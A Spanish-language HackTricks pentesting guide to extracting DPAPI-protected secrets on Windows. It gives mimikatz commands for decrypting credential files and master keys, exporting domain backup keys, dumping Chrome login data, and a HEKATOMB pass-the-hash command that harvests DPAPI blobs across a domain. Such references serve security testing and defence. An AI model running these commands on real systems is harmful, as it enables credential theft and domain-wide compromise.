# DPAPI - Extrayendo Contraseñas

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro hirviente para los profesionales de la tecnología y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

Al crear esta publicación, mimikatz tenía problemas con cada acción que interactuaba con DPAPI, por lo tanto, **la mayoría de los ejemplos e imágenes fueron tomados de**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## ¿Qué es DPAPI?

Su uso principal en el sistema operativo Windows es **realizar cifrado simétrico de claves privadas asimétricas**, utilizando un secreto de usuario o sistema como una contribución significativa de entropía.\
**DPAPI permite a los desarrolladores cifrar claves utilizando una clave simétrica derivada de los secretos de inicio de sesión del usuario**, o en el caso del cifrado del sistema, utilizando los secretos de autenticación de dominio del sistema.

Esto hace que sea muy fácil para el desarrollador **guardar datos cifrados** en la computadora **sin** necesidad de **preocuparse** por cómo **proteger** la **clave de cifrado**.

### ¿Qué protege DPAPI?

DPAPI se utiliza para proteger los siguientes datos personales:

* Contraseñas y datos de autocompletado de formularios en Internet Explorer, Google \*Chrome
* Contraseñas de cuentas de correo electrónico en Outlook, Windows Mail, Windows Mail, etc.
* Contraseñas de cuentas de administrador de FTP interno
* Contraseñas de acceso a carpetas y recursos compartidos
* Claves y contraseñas de cuentas de red inalámbrica
* Clave de cifrado en Windows CardSpace y Windows Vault
* Contraseñas de conexión de escritorio remoto, .NET Passport
* Claves privadas para el sistema de archivos cifrado (EFS), cifrado de correo S-MIME, certificados de otros usuarios, SSL/TLS en Internet Information Services
* EAP/TLS y 802.1x (autenticación VPN y WiFi)
* Contraseñas de red en el Administrador de credenciales
* Datos personales en cualquier aplicación protegida programáticamente con la función de API CryptProtectData. Por ejemplo, en Skype, Windows Rights Management Services, Windows Media, MSN Messenger, Google Talk, etc.
* ...

{% hint style="info" %}
Un ejemplo de una forma exitosa e inteligente de proteger datos utilizando DPAPI es la implementación del algoritmo de cifrado de contraseñas de autocompletado en Internet Explorer. Para cifrar el inicio de sesión y la contraseña para una determinada página web, llama a la función CryptProtectData, donde en el parámetro de entropía opcional especifica la dirección de la página web. Por lo tanto, a menos que se conozca la URL original donde se ingresó la contraseña, nadie, ni siquiera Internet Explorer, puede descifrar esos datos.
{% endhint %}

## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Archivos de Credenciales

Los **archivos de credenciales protegidos por la contraseña maestra** podrían estar ubicados en:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Obtén información de credenciales usando mimikatz `dpapi::cred`, en la respuesta puedes encontrar información interesante como los datos encriptados y el guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Puedes utilizar el módulo **mimikatz** `dpapi::cred` con el `/masterkey` apropiado para descifrar:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Claves maestras

Las claves DPAPI utilizadas para cifrar las claves RSA del usuario se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde {SID} es el [**Identificador de seguridad**](https://en.wikipedia.org/wiki/Security\_Identifier) **de ese usuario**. **La clave DPAPI se almacena en el mismo archivo que la clave maestra que protege las claves privadas del usuario**. Por lo general, consta de 64 bytes de datos aleatorios. (Tenga en cuenta que este directorio está protegido, por lo que no se puede listar usando `dir` desde el cmd, pero se puede listar desde PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Esto es lo que parecerá un conjunto de Claves Maestras de un usuario:

![](<../../.gitbook/assets/image (324).png>)

Por lo general, **cada clave maestra es una clave simétrica cifrada que puede descifrar otro contenido**. Por lo tanto, **extraer** la **Clave Maestra cifrada** es interesante para poder **descifrar** más tarde ese **otro contenido** cifrado con ella.

### Extraer y descifrar la clave maestra

En la sección anterior encontramos el guidMasterKey que parecía ser `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, este archivo estará dentro de:
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```
Para dónde puedes extraer la clave maestra con mimikatz:
```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```
El archivo mostrará la clave maestra en la salida.

Finalmente, puedes usar esa **clave maestra** para **descifrar** el **archivo de credenciales**:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```
### Extraer todas las claves maestras locales con permisos de administrador

Si eres administrador, puedes obtener las claves maestras de dpapi usando:
```
sekurlsa::dpapi
```
### Extraer todas las claves maestras de backup con Domain Admin

Un administrador de dominio puede obtener las claves maestras de backup de dpapi que se pueden utilizar para descifrar las claves cifradas:
```
lsadump::backupkeys /system:dc01.offense.local /export
```
Usando la clave de respaldo recuperada, vamos a descifrar la clave maestra del usuario `spotless`:
```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
Ahora podemos descifrar los secretos de Chrome del usuario `spotless` utilizando su clave maestra descifrada:
```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
## Cifrado y descifrado de contenido

Puede encontrar un ejemplo de cómo cifrar y descifrar datos con DPAPI usando Mimikatz y C++ en [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
Puede encontrar un ejemplo de cómo cifrar y descifrar datos con DPAPI usando C# en [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) es una versión en C# de algunas funcionalidades de DPAPI del proyecto Mimikatz de [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y equipos del directorio LDAP y la extracción de la clave de copia de seguridad del controlador de dominio a través de RPC. El script resolverá todas las direcciones IP de los equipos y realizará un smbclient en todos los equipos para recuperar todos los blobs de DPAPI de todos los usuarios y descifrar todo con la clave de copia de seguridad del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

¡Con la lista de equipos extraída de LDAP, puede encontrar todas las subredes incluso si no las conocía!

"Porque los derechos de administrador de dominio no son suficientes. Hackéalos a todos".

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente.

## Referencias

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro candente para los profesionales de la tecnología y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una empresa de **ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
